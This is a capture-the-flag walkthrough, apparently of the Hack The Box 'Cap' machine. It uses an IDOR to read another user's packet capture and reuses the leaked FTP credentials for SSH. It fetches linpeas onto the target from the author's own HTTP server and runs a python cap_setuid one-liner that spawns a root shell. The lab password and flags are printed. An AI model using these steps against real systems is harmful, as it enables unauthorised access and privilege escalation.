----------
*Linux* - Running an HTTP server that performs administrative functions including network captures. Improper controls result in IDOR giving access to another user's capture. It contains plaintext credentials and can be used to gain foothold. A Linux capability then is leveraged to escalate to root.

-----------------------
## Task 1

How many TCP ports are open?

## Solution 1

Run the scan via the Nmap:

```sh
nmap -sV 10.10.10.245
```

And this shows the open TCP ports, which in our case is three.

```sh
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
```

-----------
## Task 2

After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?

## Solution 2

On the page, there is a functionality "Security Snapshot", when we click on that one, it goes to a Security Dashboard whose URL is `/data/40`, so the answer to this is `data`.

------------
## Task 3

Are you able to get to other users' scans?

## Solution 3

As we saw on the previous task, the URL was `/data/40` which generates a `.pcap` security report, and if we open that with `Wireshark` we see that its just that.

The important point here is that in the URL there is an ID, which may suggest that there may be and `IDOR` vulnerability, so let's test it by giving some other number.

I gave some random numbers, such as 7, and downloaded the report, I see that it's the same source IP address, so it's ours.

But, when I gave the 0 as ID, it produced much more results, and there are different IP-s which are not mine, so yes, I can see other users scans, utilizing the IDOR vulenrability.

-------------
## Task 4

What is the ID of the PCAP file that contains sensitive data?

##  Solution 4

As was shown in the previous task, it is 0.

-----------

## Task 5

Which application layer protocol in the pcap file can the sensitive data be found in?

## Solution 5

On the Wireshark from the `0.pcap` we see sensitive information such as `username = nathan` and `password = Buck3tH4TF0RM3!` on the `ftp` protocol, so the answer here is `ftp`.

-------------

## Task 6

We've managed to collect nathan's FTP password. On what other service does this password work?

## Solution 6

From the **Task 1** we saw an `ssh` service, so we try to connect to that with the found credentials.

```sh
ssh nathan@10.10.10.245
```

And when provided with the password it connected to it, so the answer is `ssh`.

----------

## Task 7

Submit the flag located in the nathan user's home directory.

## Solution 7

We now are logged in on the `/home/nathan` directory, and we list the files:

```sh
ls -l
total 820
-rwxrwxr-x 1 nathan nathan 828287 Apr  2  2023 linpeas.sh
drwxr-xr-x 3 nathan nathan   4096 Mar 16 11:24 snap
-r-------- 1 nathan nathan     33 Mar 16 03:12 user.txt
```

I open the `user.txt`:

```sh
cat user.txt
9f961b671cb52c104970990247004b94
```

And this is the flag.

----------

## Task 8

What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

## Solution 8

Let's download the `linPEAS` a Linux privilege escalation tool.

```sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

But, this didn't work, as it was unable to resolve the host address, so I will download this to my machine, and then download it from the target machine.

```sh
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Then start a server, such as the one with python:

```sh
python3 -m http.server
```

Now, download it to the target machine:

```sh
wget http://10.10.14.187:8000/linpeas.sh
```

Add the execution permissions:

```sh
chmod +X linpeas.sh
```

And from the results we see a highlighted file that is a *file with capabilities*:

```sh
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The answer to this task is `/usr/bin/python3.8`.

-----------

## Final Task

Submit the flag located in root's home directory.

## Solution

File with capabilities means that the binary has the `CAP_SETUID` capability set or it is executed by another binary with the capability set.

And being such, it can be used to manipulate the process UID and escalate privileges

This can be done by executing:

```sh
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Now I'm root:

```sh
whoami
root
```

Navigate to the root's home folder.

```sh
cd /root
```

There we have a `root.txt` file, which has the flag:

```sh
cat root.txt
a123e36a0476425550c6432f5d403cbe
```

Which is the final flag and solves the lab.

